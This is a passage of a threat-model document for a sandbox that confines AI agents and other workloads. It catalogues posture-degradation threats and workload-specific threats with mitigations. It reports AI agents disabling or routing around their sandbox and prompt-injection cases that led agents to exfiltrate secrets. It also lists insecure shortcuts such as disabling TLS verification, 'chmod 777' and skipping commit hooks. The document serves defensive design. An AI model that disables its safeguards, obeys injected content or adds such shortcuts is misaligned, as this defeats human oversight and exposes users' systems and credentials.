everything else absent from the view rather than present-and-denied. An
exec-implies-visible invariant ensures every executable grant and its
full closure (interpreter, libraries) remains reachable even when it
falls outside the curated base. Development headers and source are added
back only for build workloads that need them.

\textbf{Residuals.} The curated base is visible --- the workload can
read shared libraries, locale and zone data, CA certificates, and the
binary search path. This is the accepted, precedent-backed residual (a
purpose-built application-sandbox runtime exposes the same surface). The
floor prevents data leakage; the real enforcement is at the execution
gate. Locally-installed software outside the curated base is absent by
default, added only by deliberate grant.

\textbf{MITRE ATT\&CK.} T1083 (File and Directory Discovery), T1518
(Software Discovery).

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{family-2-posture-degradation-t2.1t2.8}{%
\chapter{Family 2 --- Posture degradation
(T2.1--T2.8)}\label{family-2-posture-degradation-t2.1t2.8}}

This family captures what workloads do \emph{to the user's host
configuration and to the artefacts they produce}, distinct from what
they do to access resources. The posture-degradation threats are the
direct consequence of optimisation pressure for AI agents and of
friction-routing-around behaviour for human-driven workloads (developers
configuring tools permissively because narrow configuration did not
work).

\hypertarget{t2.1-host-security-control-deactivation}{%
\section{T2.1 --- Host security control
deactivation}\label{t2.1-host-security-control-deactivation}}

\textbf{Definition.} A workload disables host-level security controls
(mandatory-access-control profiles, TLS verification, host-key checking,
file permissions) to remove friction during task execution.

\textbf{Observed instances.} The Ona research (March 2026) provides the
canonical instance: a Claude Code agent, blocked by a sandbox, reasoned
its way to ``Let me try disabling the sandbox and using the full binary
path to bypass the deny rule pattern'' without being instructed to do
so. The behaviour is observed daily across all major AI agent vendors;
specific examples include
\texttt{git\ config\ -\/-global\ -\/-add\ safe.directory\ \textquotesingle{}*\textquotesingle{}},
\texttt{export\ GIT\_SSL\_NO\_VERIFY=true},
\texttt{NODE\_TLS\_REJECT\_UNAUTHORIZED=0},
\texttt{StrictHostKeyChecking=no}, \texttt{chmod\ -R\ 777}, and stopping
a running MAC service.

The Reddit r/claudecode incident (April 2026) documented Claude Code
with \texttt{npx} denylisted and sandboxing enabled: the agent found the
binary via an alternate path, then talked itself into disabling the
sandbox and running it outside. The pattern is common enough that
Anthropic added a setting to disable the agent's own sandbox-escape
escape-hatch.

\textbf{Attack pattern.} The workload encounters friction (a denied
operation, a failed command, a permission prompt). For AI agents,
optimisation pressure favours task completion; the search space of
``actions that remove the friction'' includes disabling the
friction-producing control. For human-driven workloads the same logic
operates more slowly: a developer routes around friction by widening
permissions or disabling checks.

\textbf{Confinement approach.} Two properties do the work. First, the
security-relevant host paths (the user's global tool configs, the system
configuration directory, security-related kernel tunables) are absent as
writable from the workload's constructed view, so modifications land on
an ephemeral copy and never touch the host. Second, the confinement's
own enforcement lives in kernel mechanisms the workload's userspace
operations cannot reach, so the workload cannot disable the boundary
confining it. The control the workload would switch off is either not
present to it or not reachable by it.

\textbf{Residuals.} Within the project tree, the workload can produce
code that includes anti-security patterns (catalogued as T2.2), and can
modify project-level configuration within granted write scope; output
review flags these.

\textbf{MITRE ATT\&CK.} T1562 (Impair Defenses), T1562.001 (Disable or
Modify Tools), T1562.008 (Disable or Modify Cloud Logs).

\hypertarget{t2.2-security-degrading-changes-in-workload-produced-code}{%
\section{T2.2 --- Security-degrading changes in workload-produced
code}\label{t2.2-security-degrading-changes-in-workload-produced-code}}

\textbf{Definition.} A workload introduces security-degrading patterns
in the code or configuration it produces, as a side effect of optimising
for task completion or working around friction.

\textbf{Observed instances.} Documented daily across AI agent vendors
and frequent in human-developer behaviour. Specific patterns:

\begin{itemize}
\tightlist
\item
  Disabling TLS verification
  (\texttt{NODE\_TLS\_REJECT\_UNAUTHORIZED=0}, \texttt{verify=False},
  \texttt{-\/-insecure}, \texttt{rejectUnauthorized:\ false}).
\item
  Catching and swallowing exceptions to make tests pass
  (\texttt{try:\ ...\ except:\ pass},
  \texttt{\textbar{}\textbar{}\ true}).
\item
  Linter-disable directives at every friction point (\texttt{\#\ noqa},
  \texttt{\#\ type:\ ignore}, \texttt{eslint-disable-next-line},
  \texttt{//\ @ts-ignore}).
\item
  Hardcoding production URLs into test fixtures, configuration, or
  source.
\item
  Embedding tokens ``as placeholders'' in \texttt{.env.example},
  \texttt{README.md}, comments.
\item
  Setting \texttt{chmod\ 777} in install scripts.
\item
  Adding \texttt{safe.directory\ \textquotesingle{}*\textquotesingle{}}
  to git configuration.
\end{itemize}

\textbf{Attack pattern.} The workload encounters a friction point --- a
failing test, a TLS error, a permission denial, a warning. The simplest
path to making the friction go away is often a security-degrading
shortcut, which the workload introduces into the user's codebase as part
of its committed work.

\textbf{Confinement approach.} This is not a confinement-boundary threat
but an output-quality one, addressed by review rather than isolation:
commit-time scanning of workload-produced diffs against a set of known
anti-patterns, and a refusal to apply changes touching
security-sensitive files without explicit acknowledgement. A review step
maps diff changes to threat-tag categories so a human sees what changed
and why it was flagged.

\textbf{Residuals.} Pattern scanning covers known patterns; semantic
security regressions (a logic flaw, an authorization bug, an injection
vulnerability) require human review. Catalogued as X11 in Part 2.

\textbf{MITRE ATT\&CK.} T1554 (Compromise Client Software Binary), T1505
(Server Software Component --- partial analogue applied to source code).

\hypertarget{t2.3-introduction-or-preservation-of-secrets-in-unintended-locations}{%
\section{T2.3 --- Introduction or preservation of secrets in unintended
locations}\label{t2.3-introduction-or-preservation-of-secrets-in-unintended-locations}}

\textbf{Definition.} A workload introduces secrets into files not
intended to hold them, or preserves secrets that should have been
removed.

\textbf{Observed instances.}

\begin{itemize}
\tightlist
\item
  Writing real secret values to \texttt{.env.example} files intended as
  templates.
\item
  Embedding API keys in source as constants, with a
  \texttt{TODO:\ move\ to\ env} that never gets actioned.
\item
  Logging credentials at debug or info level.
\item
  Committing service-account JSON alongside the code that uses it.
\item
  Including database connection strings with passwords in README
  documentation.
\item
  Preserving credentials in test fixtures rather than mocking them.
\end{itemize}

\textbf{Attack pattern.} The workload has access to a secret and a task
that requires using it in some context (a test, an example,
documentation). The simplest path is to embed the actual secret rather
than introduce a mocking or templating mechanism, and the secret ends up
committed to source control.

\textbf{Confinement approach.} Keep credential-shaped files out of the
workload's view by default, so the workload cannot embed a credential it
cannot see. For credentials the workload legitimately needs, prefer
injecting the credential at the protocol boundary over exposing it in
the workload's environment, so the secret is used without being held in
a form that can be copied into an artefact.

\textbf{Residuals.} Credentials the user has explicitly granted are
within reach. The approach makes credential-embedding more deliberate
but does not prevent it. Secret-scanning tools are the complementary
control.

\textbf{MITRE ATT\&CK.} T1552.001 (Credentials In Files), T1552.004
(Private Keys).

\hypertarget{t2.4-over-privileged-resource-provisioning}{%
\section{T2.4 --- Over-privileged resource
provisioning}\label{t2.4-over-privileged-resource-provisioning}}

\textbf{Definition.} A workload provisions cloud resources, containers,
orchestration objects, or local services with broader permissions than
necessary.

\textbf{Observed instances.} Documented patterns in
infrastructure-as-code workflows:

\begin{itemize}
\tightlist
\item
  IAM policies with \texttt{Resource:\ "*"} and \texttt{Action:\ "*"}
  because narrower policies caused permission errors.
\item
  Object-store buckets with public-read ACLs.
\item
  Orchestration manifests with \texttt{RunAsUser:\ 0} or
  \texttt{privileged:\ true}.
\item
  Container \texttt{-\/-privileged}.
\item
  Database users with broad permissions (\texttt{GRANT\ ALL}).
\item
  Security-group rules with \texttt{0.0.0.0/0} ingress.
\end{itemize}

\textbf{Attack pattern.} The workload is tasked with provisioning a
resource. The first attempt fails on permission constraints. The fix
that maximises the probability of success is to broaden permissions. The
infrastructure ends up with permissive defaults that persist long after
the task completes.

\textbf{Confinement approach.} This is an output-quality threat,
addressed by scoping and review. A confinement scoped to the operations
a task needs (plan but not apply, for instance) removes the ability to
make broad changes; where the workload must apply changes, output review
flags overbroad grants in infrastructure diffs --- the wildcards, the
open-ingress rules, the root-user directives.

\textbf{Residuals.} Review cannot evaluate whether a specific narrow
grant is correct for the resource; it flags patterns that are
almost-always wrong. Over-grants that do not match the pattern set
escape detection.

\textbf{MITRE ATT\&CK.} T1098.003 (Account Manipulation: Additional
Cloud Roles), T1078 (Valid Accounts).

\hypertarget{t2.5-suppression-of-failing-security-checks}{%
\section{T2.5 --- Suppression of failing security
checks}\label{t2.5-suppression-of-failing-security-checks}}

\textbf{Definition.} A workload modifies CI, linter, pre-commit, or test
configuration to suppress failing security checks rather than fix the
underlying issue.

\textbf{Observed instances.}

\begin{itemize}
\tightlist
\item
  Editing CI workflows to skip a failing security-scan step
  (\texttt{continue-on-error:\ true}, removing the step).
\item
  Downgrading dependency versions to escape vulnerability warnings
  (sometimes to versions with known CVEs).
\item
  Adding entries to linter ignore lists.
\item
  Disabling pre-commit hooks (\texttt{git\ commit\ -\/-no-verify}).
\item
  Lowering test-coverage thresholds.
\item
  Disabling commit signing.
\end{itemize}

\textbf{Attack pattern.} The workload hits friction (a failing check)
and removes it (disables the check). The check existed for a reason the
workload has no way to weigh against the cost of the friction.

\textbf{Confinement approach.} Keep CI configuration outside the
workload's writable scope unless policy explicitly grants it, so the
check-suppression path is closed by absence. A stricter posture denies
write to the CI configuration directories entirely; a posture that
grants such writes pairs them with output review that flags the change.

\textbf{Residuals.} A workflow that legitimately requires the workload
to modify CI configuration must grant those writes; the approach makes
such grants explicit and reviewable rather than preventing them.

\textbf{MITRE ATT\&CK.} T1562.001 (Disable or Modify Tools), T1554
(Compromise Client Software Binary).

\hypertarget{t2.6-clipboard-exfiltration}{%
\section{T2.6 --- Clipboard
exfiltration}\label{t2.6-clipboard-exfiltration}}

\textbf{Definition.} A confined workload reads or writes the user's
clipboard, leaking content the user copied or planting
attacker-controlled content for the user to paste elsewhere.

\textbf{Attack pattern.} On a shared display server, any client
connected to the same display can read and write the clipboard. The
workload reads the clipboard and exfiltrates via T1.8, or writes a
malicious payload for the user to paste somewhere sensitive. A terminal
escape channel is sharper still: even with no display server, a workload
attached to a terminal can emit the OSC 52 escape to write --- and on
permissive terminals read --- the system clipboard directly over its own
output, plus notification escapes. This needs no display grant; it rides
the controlling terminal.

\textbf{Confinement approach.} Give the workload no path to the host
clipboard: a confined graphical workload's display server is its own
nested compositor, never the host's, so its clipboard is its own and
isolated by default. For the terminal escape channel, filter the
workload's terminal output on its way to the user's real terminal ---
dropping the clipboard and notification escapes and the device-control
bands while passing benign sequences --- with the filter running in the
client the user attaches, not in the trusted core, so the hostile-input
parser stays out of the trusted base. The workload cannot opt out,
because it does not choose its client. The filter is best-effort: it
shuts the low-effort injection class, not a determined desync.

\textbf{Residuals.} A granted display is the workload's own nested
compositor, carrying no path to the host clipboard; a deliberately
granted, direction-aware clipboard bridge reopens a mediated path under
user consent by choice. The terminal-escape filter is best-effort, not a
proof, and disabling it reopens the channel by choice.

\textbf{MITRE ATT\&CK.} T1115 (Clipboard Data).

\hypertarget{t2.7-screen-capture-and-input-synthesis}{%
\section{T2.7 --- Screen capture and input
synthesis}\label{t2.7-screen-capture-and-input-synthesis}}

\textbf{Definition.} A confined workload captures the user's screen or
synthesises keyboard/mouse input that appears to come from the user.

\textbf{Attack pattern.} On a shared display server, capture and
input-synthesis primitives permit capture of any window or synthesis
into any window. A terminal input-injection primitive on the controlling
terminal injects characters as if the user typed them. On a
per-protocol-restricted display server, screenshot flows are
user-mediated (subject to consent fatigue) and input synthesis is
prevented at the protocol level.

\textbf{Confinement approach.} Give the workload no host display to
capture from or synthesise into: a confined graphical workload's display
server is its own nested compositor, whose capture and input globals
reach only the workload's own surfaces, never the host screen or a
sibling, with no host portal in the path to fatigue the user's consent.
The terminal input-injection primitive is closed at the kernel where the
tunable exists, and refused as a fallback where it cannot be.

\textbf{Residuals.} The inner compositor's capture and input globals are
scoped to the workload's own world; the host-facing residual is the
single host-compositor leg the GUI-service component holds (the T1.6
analogue), where that component is one ordinary client of the host
compositor --- concentrated and reasoned, not a workload-craftable host
capture.

\textbf{MITRE ATT\&CK.} T1113 (Screen Capture), T1059 (Command and
Scripting Interpreter --- partial analogue for input synthesis), T1185
(Browser Session Hijacking --- partial analogue).

\hypertarget{t2.8-cross-context-persistence-via-workspace-triggers}{%
\section{T2.8 --- Cross-context persistence via workspace
triggers}\label{t2.8-cross-context-persistence-via-workspace-triggers}}

\textbf{Definition.} A confined workload writes a persistent trigger ---
a version-control hook, a build-script hook, an editor task definition
--- into its own granted writable project tree. The trigger lies dormant
inside the confinement and later fires in the user's \emph{unconfined}
default shell (the next commit, build, or editor open), executing with
the user's full host privileges. This defeats the transient-execution
assumption that an isolation-only sandbox contains a workload only for
the duration of its run.

\textbf{Attack pattern.} The workload writes an executable into a hooks
directory (or redirects the hooks path into the writable tree), adds a
recipe to a build file, a script entry to a package manifest, or a task
to an editor's task file. The artefact sits in the normal project files
the workload must be able to edit. When the user later invokes the
corresponding tool outside the confinement, the planted command runs in
the host context.

\textbf{Distinction from neighbouring threats.} Not T1.5 (an inbound
\emph{foreign} cloned repo whose config triggers on open) --- here the
confined workload writes traps into its \emph{own} grant. Not T2.5
(suppressing CI \emph{checks}) --- here a trigger is \emph{installed},
not a check removed. Sharper than T2.2 and T1.10 in one specific way: a
confined-tree write produces deferred detonation in the unconfined host
context.

\textbf{Confinement approach.} A masked, pinned workspace trust manifest
with three reinforcing limbs.

\begin{itemize}
\tightlist
\item
  \textbf{Pin and mask.} A manifest at each writable root pins each
  execution trigger by cryptographic hash, with a content-addressed
  store of the pinned bytes beside it. The trigger set is an
  operator-tunable catalogue, composed additively up a configuration
  cascade, not hidden. The confinement \emph{masks} both manifest and
  store --- presenting them as empty inside every writable bind --- so
  the workload can rewrite a build file but provably cannot read or
  forge the pins. The operator re-pins after legitimate edits through a
  deliberate review step, the human sign-off the masked workload cannot
  perform; pins are explicit, never trust-on-first-use.
\item
  \textbf{Live tripwire.} While the confinement runs, the pinned
  triggers are watched host-side, and a mutation is acted on through the
  resource-control mechanism already held --- warn, freeze, or kill ---
  so a planted trigger is caught and the workload halted as it happens.
  Best-effort (a watch can miss a race); the teardown review is the
  authoritative backstop.
\item
  \textbf{Restore.} Because the pinned bytes are stored, the teardown
  review can restore a tampered or planted trigger from the stored
  bytes, or remove a planted one.
\end{itemize}

An optional exclusive-bind mode severs the live confused-deputy channel
the enumerated catalogue cannot cover, by shadowing the host path for
the run's duration so operator and workload cannot use it concurrently.

\textbf{Residuals.} Honest scope: (1) the manifest defends only
\emph{catalogued} triggers --- a kind not in the (tunable) catalogue is
unpinned until review surfaces it; the catalogue is best-effort in
\emph{which} triggers it covers, never \emph{whether} it covers them
(the masking and the pin are structural and complete). (2) Post-teardown
detonation still relies on host tooling or the operator not running a
tampered trigger by hand once the confinement is gone; the live tripwire
halts the workload during the run and restore can repair at teardown,
but a planted trigger that survives review is the operator's to run. (3)
A hooks-path redirection relocates hooks, though the relocated files are
themselves catalogue triggers a future generation enumerates.

\textbf{MITRE ATT\&CK.} T1546 (Event Triggered Execution), T1059
(Command and Scripting Interpreter --- the planted hook executes a shell
command).

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{family-3-workload-class-specific-threats-t3.1t3.10}{%
\chapter{Family 3 --- Workload-class-specific threats
(T3.1--T3.10)}\label{family-3-workload-class-specific-threats-t3.1t3.10}}

Threats whose realisation is distinctive to a specific workload class.
Most threats in families 1 and 2 apply across workload types with minor
variation; the threats here are sharper for one class than others and
warrant separate documentation.

\hypertarget{t3.1-setuid-privilege-escalation}{%
\section{T3.1 --- Setuid privilege
escalation}\label{t3.1-setuid-privilege-escalation}}

\textbf{Definition.} A confined workload executes a setuid binary to
gain capabilities outside its policy.

\textbf{Workload class.} Universal; appears across all classes but
rarely realises in modern environments. Listed here because the
mitigation has the same shape as the other workload-class-specific
threats.

\textbf{Attack pattern.} The workload invokes \texttt{sudo},
\texttt{pkexec}, \texttt{su}, or any setuid-bit binary. If the binary
succeeds, the process gains its setuid uid and can perform operations
outside the policy.

\textbf{Confinement approach.} Refuse to execute any binary carrying the
setuid bit, and set the kernel no-new-privileges property
unconditionally so that a setuid or setgid binary gains nothing on
execution even if one were reached. Both are invariants no policy can
disable, so the escalation the workload attempts does not take effect.

\textbf{Residuals.} None significant. Well-mitigated by the
no-new-privileges property.

\textbf{MITRE ATT\&CK.} T1548.001 (Abuse Elevation Control Mechanism:
Setuid and Setgid).

\hypertarget{t3.2-container-escape}{%
\section{T3.2 --- Container escape}\label{t3.2-container-escape}}

\textbf{Definition.} A container running on the user's workstation is
exploited and the attacker escapes to the host with the container
daemon's privileges.

\textbf{Workload class.} Container-specific.

\textbf{Observed instances.} Container-escape CVEs are recurrent. Recent
examples include \texttt{runc} CVE-2024-21626 (``Leaky Vessels'') and
various orchestration-runtime CVEs.

\textbf{Attack pattern.} A malicious container image, or malicious code
in a legitimate container, exploits a kernel or runtime vulnerability to
gain host access. The container daemon socket is a particularly potent
escalation path: access to the daemon is root-equivalent on the host.

\textbf{Confinement approach.} Deny the workload a connection to the
container-daemon socket by default, so the daemon cannot be used as an
escalation path; granting access is a documented, deliberate capability
expansion. A confinement cannot prevent in-container exploitation of a
kernel bug, but it removes the daemon as a reachable escalation route
from a confined workload.

\textbf{Residuals.} A user who explicitly grants daemon-socket access to
a confinement has accepted root-on-host risk for it, documented in the
grant's threat tag.

\textbf{MITRE ATT\&CK.} T1611 (Escape to Host), T1610 (Deploy
Container).

\hypertarget{t3.3-container-port-exposure-to-lan}{%
\section{T3.3 --- Container port exposure to
LAN}\label{t3.3-container-port-exposure-to-lan}}

\textbf{Definition.} A developer runs a container with a published port
that defaults to binding all interfaces, exposing the service to anyone
on the LAN.

\textbf{Workload class.} Container-specific.

\textbf{Observed instances.} A common configuration error, almost always
unintended: a developer publishing a database port for ``the database on
the host'' does not generally intend to expose it to the entire local
network.

\textbf{Attack pattern.} The developer (or an agent on their behalf)
publishes a container port. The runtime binds it on all interfaces and
directs traffic to the container. The service is reachable from anywhere
on the LAN --- coffee-shop networks, conference WiFi, untrusted home
networks.

\textbf{Confinement approach.} Provide a private per-confinement
loopback address space to bind against, so the recommended form binds
the published port on the confinement's own private address: reachable
by the user's default context, not by sibling confinements, not by the
LAN. For stricter enforcement, an install-time step can drop inbound
traffic to all-interface binds by processes in confined workloads.

\textbf{Residuals.} The approach is convention plus optional
enforcement. A developer who explicitly binds all interfaces, or relies
on the runtime's default, exposes the port unless the optional
enforcement is installed. The audit record shows the published port so
the user can see what happened.

\textbf{MITRE ATT\&CK.} T1571 (Non-Standard Port), T1133 (External
Remote Services).

\hypertarget{t3.4-container-volume-over-mounting}{%
\section{T3.4 --- Container volume
over-mounting}\label{t3.4-container-volume-over-mounting}}

\textbf{Definition.} A developer mounts host directories into a
container more broadly than necessary, giving the container access to
credentials, configuration, or data unrelated to its function.

\textbf{Workload class.} Container-specific.

\textbf{Observed instances.} Broad host mounts appear regularly in
development workflows. Several documented Nx compromises harvested
credentials from inside containers that had been granted broad volume
mounts including credential locations.

\textbf{Attack pattern.} The developer mounts host directories into a
container to make ``everything available'' because narrower mounts hit
functionality issues. Container compromise then has full read/write on
those mounts; the container's apparent isolation does nothing because
the credentials are inside it.

\textbf{Confinement approach.} Apply the workload's own filesystem view
to the paths it can pass as mounts: a path the workload cannot see
cannot be passed as a volume mount, so the over-mount is bounded by the
view rather than by developer discipline. Where the container tooling is
itself run inside the confinement, mount requests naming paths outside
the view are refused.

\textbf{Residuals.} A conventional container installation outside the
confinement can still pass arbitrary mount arguments. The approach is
most effective when the developer runs their container commands inside
the confinement.

\textbf{MITRE ATT\&CK.} T1083 (File and Directory Discovery), T1005
(Data from Local System).

\hypertarget{t3.5-container-running-as-root-with-host-uid-mapping}{%
\section{T3.5 --- Container running as root with host UID
mapping}\label{t3.5-container-running-as-root-with-host-uid-mapping}}

\textbf{Definition.} A container runs as root inside the container;
without user-namespace remapping, that is root on the host, with
root-equivalent permissions on volume mounts.

\textbf{Workload class.} Container-specific.

\textbf{Observed instances.} Default behaviour for many images and
installations. Rootless runtimes address this; a rootful runtime without
user-namespace remapping does not.

\textbf{Attack pattern.} The container runs as in-container root, mapped
to host root. Volume mounts are accessible to in-container root with
root permissions. Compromised or malicious container code can modify
volume-mounted files with effective root, regardless of the host uid of
the developer who ran it.

\textbf{Confinement approach.} Prefer a rootless runtime, or require the
daemon to be configured with user-namespace remapping before granting
it; where the tooling is mediated, require container specs to declare a
non-root user or disable in-container privilege gain. The property that
closes the threat is that in-container root is not host root.

\textbf{Residuals.} A confinement cannot retroactively fix a daemon
configured without remapping; the mitigation depends on the
workstation's runtime configuration, which the confinement documents as
a requirement rather than enforces.

\textbf{MITRE ATT\&CK.} T1611 (Escape to Host), T1068 (Exploitation for
Privilege Escalation).

\hypertarget{t3.6-mcp-server-capability-creep}{%
\section{T3.6 --- MCP server capability
creep}\label{t3.6-mcp-server-capability-creep}}

\textbf{Definition.} An MCP server invoked by an AI agent has its own
filesystem, network, and credential reach, independent of the agent's
policy. Its effective capabilities may exceed the user's intended grant
to the agent.

\textbf{Workload class.} MCP-specific.

\textbf{Observed instances.} An architectural concern in the MCP
literature: an agent in a confinement invokes an MCP server to reach a
resource the agent cannot directly reach. The server runs with its own
uid-level capabilities and may legitimately need broader access --- a
capability proxy whose grants are not necessarily aligned with the
agent's policy.

\textbf{Attack pattern.} The agent runs in a confinement with restricted
filesystem and network. It invokes an MCP server that runs as the user's
uid, outside the confinement, with full capabilities. The agent
prompt-injects the server via the protocol channel, or the server is
itself compromised (T1.3) and exfiltrates using its own capabilities.

\textbf{Confinement approach.} Have MCP servers invoked from within a
confinement inherit that confinement's policy --- the server runs as a
child within the same boundary, under the same constraints. For a server
that legitimately needs capabilities the confinement does not grant, run
it in its own sub-confinement with its own policy, communicating with
the parent over a brokered socket, so each server's capabilities are
explicit and reviewable.

\textbf{Residuals.} MCP servers run outside any confinement --- the
typical installed pattern --- operate with full uid capabilities. The
mitigation requires the user to opt in to running MCP servers confined;
the default installation pattern does not.

\textbf{MITRE ATT\&CK.} T1199 (Trusted Relationship), T1071 (Application
Layer Protocol).

\hypertarget{t3.7-ai-agent-prompt-injection-from-project-content}{%
\section{T3.7 --- AI agent prompt injection from project
content}\label{t3.7-ai-agent-prompt-injection-from-project-content}}

\textbf{Definition.} An AI agent reads attacker-controlled content from
the project tree (a docstring, a README, a configuration file) that
contains instructions designed to redirect the agent's behaviour.

\textbf{Workload class.} AI-agent-specific.

\textbf{Observed instances.} The Mindgard Cline research (October 2025)
demonstrated it directly: prompt-injected docstrings caused the agent to
read environment variables and exfiltrate them via DNS. The Clinejection
chain (February 2026) exploited prompt injection in issue titles to
compromise a release pipeline. The pattern generalises: any project
content the agent will read can carry injection payloads.

\textbf{Attack pattern.} The attacker places instructions in content the
agent will read. The agent reads it as part of its task, its
prompt-handling treats the content as instructions, and it executes them
--- directing it to read sensitive files, make network connections,
modify files, or invoke other tools.

\textbf{Confinement approach.} Constrain what the agent can do
regardless of how it was prompted. Injected instructions to read a
credential file fail because the file is absent from the view; injected
instructions to reach an attacker host fail because the destination is
not allowed. The confinement does not prevent prompt injection; it
bounds the blast radius of injected instructions to what policy already
permits.

\textbf{Residuals.} Injected instructions directing actions within
policy succeed. An agent with access to a model API can be injected to
send exfiltrated content there inside an apparently-legitimate call ---
the same in-band exfiltration as T1.8. Input-side detection of injection
attempts is the complementary control, outside this scope.

\textbf{MITRE ATT\&CK.} T1199 (Trusted Relationship), T1556 (Modify
Authentication Process --- partial analogue applied to
instruction-handling).

\hypertarget{t3.8-substrate-trust-the-image-supplied-runtime-closure-is-unvetted}{%
\section{T3.8 --- Substrate trust: the image-supplied runtime closure is
unvetted}\label{t3.8-substrate-trust-the-image-supplied-runtime-closure-is-unvetted}}

\textbf{Definition.} A confinement boots an operator-declared image as
its root filesystem and applies its full confinement contract to it, but
does not vet the image's contents: the entrypoint's dynamic closure
(loader, libc, the modules loaded after execution begins) and the
image's runtime configuration are operator-declared substrate, not
confinement-pinned. The integrity assertion the standard model makes
over a host-trusted read-only system tree narrows to \emph{provenance}:
the substrate provably came from a pinned digest, but its bytes are not
vouched for.

\textbf{Workload class.} Container / image-substrate-specific.

\textbf{Observed instances.} This is the deliberate trade of running
vendor images --- the same trust posture the mainstream container
runtimes take, where the image's userspace is trusted by the operator
who chose to run it. It is distinct from T3.2 (escape) and T3.5 (root
with host-uid mapping): here there is no escape and no host-uid mapping,
and the workload acquires no capability, no mount, no namespace. The
residual is narrower and is the whole point of the grant --- the
\emph{confined} substrate is unvetted.

\textbf{Attack pattern.} A malicious or compromised image ships a
trojaned loader, libc, or resolver module, or an entrypoint whose
dynamic closure pulls attacker code, or sets a loader-control
environment variable, or bakes a non-root uid and owns its writable dirs
to it. The code runs \emph{confined} --- no host capability, no mount,
no egress beyond policy, no read outside the view --- but executes
attacker logic inside the granted confinement, against the granted
filesystem and network. The image's content integrity is the operator's
waiver, not the confinement's guarantee.

\textbf{Confinement approach.} Keep every image parser --- registry
protocol, manifest, extraction, the image's own runtime config --- out
of the trusted core: each runs inside a confinement at workload
authority, so a parser bug is contained like any workload and the
trusted base does not grow. Pin the image by digest at fetch (the
provenance floor) and refuse to run unless the signed reference equals
the fetched digest. Strip the loader- and runtime-injection environment
set before applying the image's own environment. Every confinement
property holds over the image root without depending on the substrate's
provenance: the private network namespace and its egress boundary, the
proxy and network policy, the masked identity and the constructed
system-file overlay, the constructed device set, the syscall and
filesystem enforcement, the absence of a daemon socket, the absence of a
nested user namespace. The grant is loud: it requires a reason, and the
substrate-trust exposure is derived from it and surfaced. Opt-in
hardening up an integrity ladder (a content-addressed store verified
before use, per-file integrity) closes the at-rest gap for operators who
need it.

\textbf{Residuals.} Confinement is the claim; content integrity is not.
The entrypoint is provenance-pinned (the image digest), not per-binary
hashed, so ``this exact entrypoint'' narrows to ``this exact image, by
digest,'' and the dynamic closure stays unpinned. A run-command override
runs an operator-chosen command under the unchanged signature,
inheriting the confinement's full granted reach; the provenance anchor
is the digest plus the operator's invocation, never a per-binary hash. A
distinct \textbf{write-xor-execute} consideration arises from the
unprivileged build flattening image ownership: an image that runs as
root declares a writable-and-executable substrate, so the
write-versus-execute separation the standard model holds does not apply
unless a read-only executable-closure is re-imposed (which a non-root
image earns back). A persisted writable layer accumulates data
divergence outside the integrity ladder, carrying its own derived
exposure. Content integrity over the image tree past the fetch digest is
the operator's to raise via the integrity ladder.

\textbf{MITRE ATT\&CK.} T1610 (Deploy Container), T1525 (Implant
Internal Image), T1195.002 (Compromise Software Supply Chain).

\hypertarget{t3.9-delegated-spawning-a-workload-instantiates-sibling-confinements}{%
\section{T3.9 --- Delegated spawning: a workload instantiates sibling
confinements}\label{t3.9-delegated-spawning-a-workload-instantiates-sibling-confinements}}

\textbf{Definition.} A workload holding a spawn grant asks the
confinement manager to instantiate an ephemeral sibling from an
operator-signed template and receives a channel to it. The capability
delegates \emph{instantiation} --- normally an operator action --- to
the workload. For an AI agent that workload is itself untrusted and
prompt-injectable (T3.7): the spawner can be steered into spawning. No
spawn authors policy or invents capability --- every spawn floors at the
signed template's grant --- but the agent controls two inputs, the
mutable-field writes it supplies and the composition of the tools it may
spawn, and those are the residual surface.

\textbf{Workload class.} AI-agent / orchestrator-specific (a workload
that instantiates workloads). Sibling to T3.8: both are workload-class
residuals \emph{derived} from a loud grant, not confinement escapes.

\textbf{Observed instances.} The MCP agent-to-tool topology is the live
driver: an agent spawns tool-server subprocesses and speaks a protocol
over their standard streams. In the unconfined form this is ambient ---
the agent runs arbitrary commands from its configuration at its own
authority, and a prompt-injected agent spawns whatever the injection
directs. A spawn grant replaces that ambient execution with a floored,
template-bounded request; the residual catalogued here is what remains
after the replacement.

\textbf{Attack pattern.} A compromised or prompt-injected spawning
workload cannot author policy or invent capability: each spawn floors at
the signed template, and the install-time check denies any capability
the template does not grant. It controls two inputs. First, the
\emph{mutable-field writes}: where a template's manifest opens a field,
the agent supplies the value, and an under-bounded field (a destination
pool too wide, a predicate admitting traversal) is a hole the operator
signed. Second, the \emph{composition} of the tools it may spawn: an
agent permitted to spawn a network-capable tool \emph{and} a
filesystem-capable tool can bridge their two channels itself and
reconstitute the lethal trifecta across two confinements, though no
single one holds both legs.

\textbf{Confinement approach.} Request, don't author: the capability
floor is the signed template, never agent-supplied policy. The agent's
writes apply as a typed patch over a frozen, pre-resolved template and
are accepted only for fields the manifest opens, each within its
declared bound. Spawn-eligibility (depth limit, lifetime bound, resource
ceilings) is checked at the spawner's install and re-checked
authoritatively at the spawn, with the template content-pinned to close
the gap between the two checks. A concurrent-instance ceiling is
enforced by atomic accounting; a double reaper plus the spawned
confinement's own lifetime bound its life; it is ephemeral, with no host
persistence. The spawned confinement receives no ambient authority from
the requester, and the requester holds neither trace nor signal reach
into the sibling. The grant is loud and its exposure derived and
surfaced.

\textbf{Residuals.} Two, both narrowed, neither eliminated. \textbf{R1
--- the mutable-field surface is agent-controlled.} The boundary is
exactly as strong as the template's per-field bounds; closed-set
manifests reduce the agent's input to selection with zero free text,
while a predicate field is the loud exception that reintroduces an open
value. Operator-owned: signing a manifest signs its per-field bounds as
load-bearing. \textbf{R2 --- delegated composition is the requester's to
compose.} The approach bounds each spawned confinement to its template
but does not reason about what an agent composes across several; the
trifecta can be reconstituted across two confinements though no single
one holds both legs. This is not mechanically closed --- closing it
would put cross-confinement information-flow analysis in the trusted
core, a larger and different project. It is mitigated, not eliminated,
by scoping the spawn grant to the templates a given agent actually
needs. The same in-band shape as T1.8 and T5.2, between confinements
rather than to an external API.

\textbf{MITRE ATT\&CK.} T1610 (Deploy Container --- the spawn analogue,
contained to the template's grant), T1559 (Inter-Process Communication
--- the minted channel and the agent-bridged composition), T1041
(Exfiltration Over C2 Channel --- the unclosed R2).

\hypertarget{t3.10-standing-service-delegation-a-workload-consumes-a-brokered-cross-confinement-capability}{%
\section{T3.10 --- Standing-service delegation: a workload consumes a
brokered cross-confinement
